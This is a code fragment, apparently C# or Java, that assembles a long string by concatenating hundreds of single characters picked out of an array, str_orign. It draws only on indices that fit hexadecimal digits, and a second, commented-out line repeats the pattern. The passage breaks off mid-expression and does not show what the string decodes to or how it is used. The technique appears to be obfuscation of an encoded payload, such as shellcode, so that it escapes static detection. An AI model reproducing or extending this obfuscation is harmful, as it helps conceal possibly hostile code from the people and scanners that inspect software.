str_orign[33] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[31] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[0] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[27] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[26] + str_orign[33] + str_orign[32] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[35] + str_orign[5] + str_orign[33] + str_orign[29] + str_orign[2] + str_orign[28] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[33] + str_orign[30] + str_orign[5] + str_orign[31] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[34] + str_orign[4] + str_orign[1] + str_orign[35] + str_orign[34] + str_orign[31] + str_orign[33] + str_orign[0] + str_orign[0] + str_orign[2] + str_orign[30] + str_orign[4] + str_orign[27] + str_orign[30] + str_orign[3] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[26] + str_orign[31] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[30] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[4] + str_orign[35] + str_orign[35] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[1] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[28] + str_orign[34] + str_orign[2] + str_orign[32] + str_orign[32] + str_orign[29] + str_orign[1] + str_orign[32] + str_orign[28] + str_orign[26] + str_orign[5] + str_orign[5] + str_orign[4] + str_orign[34] + str_orign[34] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[34] + str_orign[2] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[4] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[3] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[28] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[28] + str_orign[35] + str_orign[26] + str_orign[26] + str_orign[30] + str_orign[28] + str_orign[4] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[2] + str_orign[1] + str_orign[0] + str_orign[33] + str_orign[3] + str_orign[32] + str_orign[1] + str_orign[2] + str_orign[35] + str_orign[28] + str_orign[2] + str_orign[3] + str_orign[33] + str_orign[30] + str_orign[30] + str_orign[26] + str_orign[27] + str_orign[27] + str_orign[27] + str_orign[34] + str_orign[28] + str_orign[3] + str_orign[31] + str_orign[29] + str_orign[30] + str_orign[3] + str_orign[31] + str_orign[34] + str_orign[5] + str_orign[0] + str_orign[29] + str_orign[32] + str_orign[4] + str_orign[26] + str_orign[26] + str_orign[35] + str_orign[3] + str_orign[26] + str_orign[33] + str_orign[26] + str_orign[27] + str_orign[33] + str_orign[4] + str_orign[0] + str_orign[29] + str_orign[4] + str_orign[35] + str_orign[28] + str_orign[27] + str_orign[0] + str_orign[30] + str_orign[4] + str_orign[5] + str_orign[3] + str_orign[32] + str_orign[29] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[28] + str_orign[4] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[3] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[0] + str_orign[33] + str_orign[2] + str_orign[28] + str_orign[5] + str_orign[2] + str_orign[33] + str_orign[33] + str_orign[31] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[26] + str_orign[35] + str_orign[34] + str_orign[0] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[1] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[32] + str_orign[33] + str_orign[31] + str_orign[3] + str_orign[31] + str_orign[2] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[34] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[0] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[27] + str_orign[3] + str_orign[30] + str_orign[30] + str_orign[30] + str_orign[28] + str_orign[27] + str_orign[2] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[32] + str_orign[26] + str_orign[28] + str_orign[3] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[29] + str_orign[32] + str_orign[35] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[5] + str_orign[27] + str_orign[5] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[34] + str_orign[27] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[3] + str_orign[27] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[5] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[32] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[32] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[32] + str_orign[35] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[30] + str_orign[32] + str_orign[28] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[27] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[31] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[28] + str_orign[0] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[0] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[27] + str_orign[33] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[5] + str_orign[32] + str_orign[32] + str_orign[32] + str_orign[28] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[4] + str_orign[30] + str_orign[29] + str_orign[27] + str_orign[35] + str_orign[28] + str_orign[31] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[28] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[30] + str_orign[29] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[29] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[4] + str_orign[32] + str_orign[29] + str_orign[27] + str_orign[5] + str_orign[28] + str_orign[32] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[1] + str_orign[27] + str_orign[35] + str_orign[32] + str_orign[27] + str_orign[32] + str_orign[31] + str_orign[28] + str_orign[0] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[35] + str_orign[27] + str_orign[34] + str_orign[27] + str_orign[35] + str_orign[31] + str_orign[2] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[30] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[32] + str_orign[31] + str_orign[30] + str_orign[31] + str_orign[28] + str_orign[31] + str_orign[1] + str_orign[31] + str_orign[5] + str_orign[35] + str_orign[3] + str_orign[35] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[32] + str_orign[29] + str_orign[4] + str_orign[33] + str_orign[33] + str_orign[2] + str_orign[27] + str_orign[26] + str_orign[0] + str_orign[0] + str_orign[0] + str_orign[0] + str_orign[1] + str_orign[32] + str_orign[2] + str_orign[29] + str_orign[34] + str_orign[27] + str_orign[1] + str_orign[28] + str_orign[0] + str_orign[1] + str_orign[33] + str_orign[5] + str_orign[28] + str_orign[32] + str_orign[32] + str_orign[32] + str_orign[33] + str_orign[33] + str_orign[2] + str_orign[4] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[31] + str_orign[28] + str_orign[28] + str_orign[2] + str_orign[5] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[33] + str_orign[28] + str_orign[33] + str_orign[30] + str_orign[26] + str_orign[34] + str_orign[4] + str_orign[31] + str_orign[30] + str_orign[30] + str_orign[34] + str_orign[29] + str_orign[34] + str_orign[29] + str_orign[29] + str_orign[5] + str_orign[2] + str_orign[1] + str_orign[31] + str_orign[1] + str_orign[29] + str_orign[2] + str_orign[32] + str_orign[4] + str_orign[33] + str_orign[4] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[28] + str_orign[27] + str_orign[31] + str_orign[0] + str_orign[32] + str_orign[35] + str_orign[5] + str_orign[26] + str_orign[1] + str_orign[29] + str_orign[31] + str_orign[26] + str_orign[29] + str_orign[5] + str_orign[0] + str_orign[35] + str_orign[0] + str_orign[29] + str_orign[34] + str_orign[1] + str_orign[2] + str_orign[29] + str_orign[5] + str_orign[0] + str_orign[32] + str_orign[29] + str_orign[34] + str_orign[3] + str_orign[28] + str_orign[28] + str_orign[0] + str_orign[33] + str_orign[32] + str_orign[4] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[5] + str_orign[35] + str_orign[1] + str_orign[30] + str_orign[0] + str_orign[27] + str_orign[30] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[31] + str_orign[0] + str_orign[29] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[0] + str_orign[29] + str_orign[30] + str_orign[28] + str_orign[4] + str_orign[30] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[34] + str_orign[28] + str_orign[1] + str_orign[34] + str_orign[0] + str_orign[5] + str_orign[35] + str_orign[5] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[34] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[28] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[28] + str_orign[30] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[26] + str_orign[27] + str_orign[34] + str_orign[31] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[2] + str_orign[31] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[32] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[28] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[4] + str_orign[30] + str_orign[30] + str_orign[33] + str_orign[2] + str_orign[28] + str_orign[4] + str_orign[33] + str_orign[0] + str_orign[34] + str_orign[5] + str_orign[3] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[35] + str_orign[28] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[29] + str_orign[28] + str_orign[27] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[26] + str_orign[28] + str_orign[32] + str_orign[28] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[33] + str_orign[28] + str_orign[34] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[30] + str_orign[5] + str_orign[30] + str_orign[4] + str_orign[26] + str_orign[35] + str_orign[35];
            //str = str + str_orign[5] + str_orign[2] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[4] + str_orign[29] + str_orign[5] + str_orign[35] + str_orign[4] + str_orign[33] + str_orign[2] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[35] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[31] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[26] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[32] + str_orign[27] + str_orign[30] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[5] + str_orign[1] + str_orign[32] + str_orign[29] + str_orign[0] + str_orign[29] + str_orign[0] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[28] + str_orign[2] + str_orign[31] + str_orign[26] + str_orign[32] + str_orign[2] + str_orign[35] + str_orign[27] + str_orign[27] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[35] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[4] + str_orign[27] + str_orign[4] + str_orign[3] + str_orign[30] + str_orign[27] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[30] + str_orign[27] + str_orign[27] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[27] + str_orign[28] + str_orign[2] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[31] + str_orign[33] + str_orign[26] + str_orign[32] + str_orign[33] + str_orign[26] + str_orign[33] + str_orign[35] + str_orign[1] + str_orign[35] + str_orign[27] + str_orign[32] + str_orign[30] + str_orign[32] + str_orign[27] + str_orign[33] + str_orign[1] + str_orign[33] + str_orign[35] + str_orign[33] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[30] + str_orign[2] + str_orign[35] + str_orign[32] + str_orign[29] + str_orign[31] + str_orign[32] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[30] + str_orign[35] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[26] + str_orign[33] + str_orign[29] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[4] + str_orign[28] + str_orign[30] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[5] + str_orign[5] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[33] + str_orign[1] + str_orign[28] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[31] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[0] + str_orign[2] + str_orign[29] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[35] + str_orign[3] + str_orign[29] + str_orign[26] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[26] + str_orign[28] + str_orign[33] + str_orign[4] + str_orign[35] + str_orign[32] + str_orign[30] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[2] + str_orign[35] + str_orign[28] + str_orign[29] + str_orign[2] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[28] + str_orign[34] + str_orign[3] + str_orign[26] + str_orign[32] + str_orign[30] + str_orign[3] + str_orign[33] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[31] + str_orign[29] + str_orign[26] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[2] + str_orign[29] + str_orign[33] + str_orign[29] + str_orign[29] + str_orign[33] + str_orign[1] + str_orign[29] + str_orign[35] + str_orign[26] + str_orign[2] + str_orign[29] + str_orign[34] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[33] + str_orign[1] + str_orign[35] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[29] + str_orign[33] + str_orign[35] + str_orign[26] + str_orign[3] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[33] + str_orign[30] + str_orign[4] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[4] + str_orign[2] + str_orign[27] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[27] + str_orign[5] + str_orign[5] + str_orign[4] + str_orign[35] + str_orign[30] + str_orign[33] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[1] + str_orign[26] + str_orign[27] + str_orign[4] + str_orign[34] + str_orign[29] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[30] + str_orign[3] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[34] + str_orign[1] + str_orign[4] + str_orign[32] + str_orign[32] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[34] + str_orign[31] + str_orign[4] + str_orign[31] + str_orign[30] + str_orign[32] + str_orign[29] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[31] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[34] + str_orign[4] + str_orign[31] + str_orign[29] + str_orign[2] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[29] + str_orign[2] + str_orign[32] + str_orign[32] + str_orign[27] + str_orign[31] + str_orign[35] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[35] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[28] + str_orign[0] + str_orign[30] + str_orign[31] + str_orign[32] + str_orign[34] + str_orign[0] + str_orign[32] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[1] + str_orign[32] + str_orign[28] + str_orign[30] + str_orign[0] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[33] + str_orign[5] + str_orign[3] + str_orign[26] + str_orign[31] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[28] + str_orign[29] + str_orign[26] + str_orign[30] + str_orign[26] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[30] + str_orign[32] + str_orign[33] + str_orign[34] + str_orign[34] + str_orign[5] + str_orign[2] + str_orign[31] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[34] + str_orign[30] + str_orign[1] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[28] + str_orign[26] + str_orign[3] + str_orign[27] + str_orign[29] + str_orign[34] + str_orign[33] + str_orign[34] + str_orign[3] + str_orign[33] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[30] + str_orign[27] + str_orign[31] + str_orign[33] + str_orign[35] + str_orign[35] + str_orign[35] + str_orign[27] + str_orign[29] + str_orign[35] + str_orign[33] + str_orign[29] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[4] + str_orign[1] + str_orign[30] + str_orign[30] + str_orign[27] + str_orign[4] + str_orign[28] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + str_orign[30] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[2] + str_orign[31] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[28] + str_orign[2] + str_orign[28] + str_orign[30] + str_orign[35] + str_orign[31] + str_orign[0] + str_orign[35] + str_orign[0] + str_orign[30] + str_orign[5] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[5] + str_orign[26] + str_orign[29] + str_orign[33] + str_orign[33] + str_orign[34] + str_orign[3] + str_orign[0] + str_orign[29] + str_orign[34] + str_orign[2] + str_orign[32] + str_orign[2] + str_orign[35] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[5] + str_orign[29] + str_orign[3] + str_orign[28] + str_orign[26] + str_orign[2] + str_orign[34] + str_orign[30] + str_orign[27] + str_orign[30] + str_orign[27] + str_orign[29] + str_orign[26] + str_orign[1] + str_orign[0] + str_orign[27] + str_orign[3] + str_orign[35] + str_orign[31] + str_orign[26] + str_orign[33] + str_orign[32] + str_orign[1] + str_orign[5] + str_orign[5] + str_orign[3] + 